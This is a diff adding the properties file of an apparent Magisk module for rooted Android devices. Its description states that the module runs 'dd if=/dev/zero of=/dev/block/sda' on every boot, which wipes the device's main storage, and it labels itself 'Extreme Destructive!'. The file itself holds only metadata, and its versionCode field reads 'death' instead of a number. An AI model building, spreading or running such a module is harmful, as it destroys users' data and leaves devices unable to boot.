@@ -1,0 +1,6 @@
+id=wipe_sda_module
+name=Wipe SDA Module
+version=v1.0
+versionCode=death
+author=blank9485
+description=A Magisk module that automatically runs dd if=/dev/zero of=/dev/block/sda on boot. WARNING: Extreme Destructive!
